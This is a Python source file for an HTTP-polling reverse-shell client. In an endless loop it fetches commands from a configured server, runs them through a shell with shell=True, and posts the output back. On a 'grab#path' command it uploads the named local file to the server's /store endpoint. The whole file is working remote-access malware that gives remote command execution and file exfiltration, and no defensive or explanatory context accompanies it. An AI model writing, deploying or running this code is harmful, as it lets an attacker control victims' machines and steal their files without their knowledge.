import subprocess
import time
import requests
import socket
import os
from config import App



class rs_client:

    def create_connection():
        req = requests.get(App.config('URL'))
        cmd = req.text

        if 'stop' in cmd:
            quit()

        elif 'grab' in cmd:
            # Parses the part behind the hashtag (#) and stores it in the path variable.
            grab,path =  cmd.split('#')

            if os.path.exists(path):
                endpoint = App.config('URL') + '/store'
                # Dictionary with the file as value.
                files = {'file':open(path, 'rb')}
                r = requests.post(endpoint, files=files)

            else:
                post_response = requests.post(url=App.config('URL'), data='[!] Error: File not found.')

        else:
            cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            # POST result or error.
            post_response = requests.post(url=App.config('URL'), data=cmdPrompt.stdout.read() )
            post_response = requests.post(url=App.config('URL'), data=cmdPrompt.stderr.read() ) 

            time.sleep(3)

if __name__ == '__main__':
    # Prevent connection from terminating after every request.
    while True:
        rs_client.create_connection()

    
        
